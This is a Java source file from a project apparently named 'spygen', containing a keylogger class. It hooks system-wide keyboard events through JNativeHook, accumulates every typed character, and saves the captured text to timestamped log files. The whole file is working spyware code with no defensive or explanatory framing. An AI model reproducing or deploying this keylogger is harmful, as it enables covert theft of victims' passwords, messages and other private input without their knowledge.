package com.houarizegai.spygen.keylogger;

import com.houarizegai.spygen.global.Settings;
import com.houarizegai.spygen.global.Utils;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;

public class NativeKeyboard implements NativeKeyListener {

    private static StringBuilder typedCache = new StringBuilder();

    public NativeKeyboard() {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        typedCache.append(e.getKeyChar());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        //System.out.println("Key typed: " + e.getKeyChar());
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    public void onSave() {
        try {
            FileWriter fw = new FileWriter(Settings.KEYLOGGER_PATH + "logs_" + new Date().toString().replace(" ", "_").replace(":", "-") + ".txt");
            fw.write(typedCache.toString());
            fw.close();

            typedCache = new StringBuilder(); // clean cache
        } catch(IOException ioe) {
            ioe.printStackTrace();
        }
    }

}
